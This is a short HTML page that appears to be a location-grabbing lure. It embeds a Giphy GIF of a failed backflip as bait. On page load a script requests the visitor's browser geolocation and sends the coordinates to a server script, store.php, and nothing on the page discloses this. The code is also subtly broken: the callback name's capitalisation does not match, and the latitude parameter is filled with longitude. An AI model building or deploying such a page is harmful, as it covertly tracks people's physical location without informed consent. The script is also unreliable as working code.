<body onload="getLocation()">

<iframe src="https://giphy.com/embed/YTJXDIivNMPuNSMgc0" width="444" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/moodman-fail-life-backflip-YTJXDIivNMPuNSMgc0">via GIPHY</a></p>


<p id="demo"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function ShowPosition(position) {
 const xhttp = new XMLHttpRequest();
 xhttp.open("GET", "store.php?lat=" + position.coords.longitude +"&long=" + position.coords.longitude);
 xhttp.send();
}
</script>
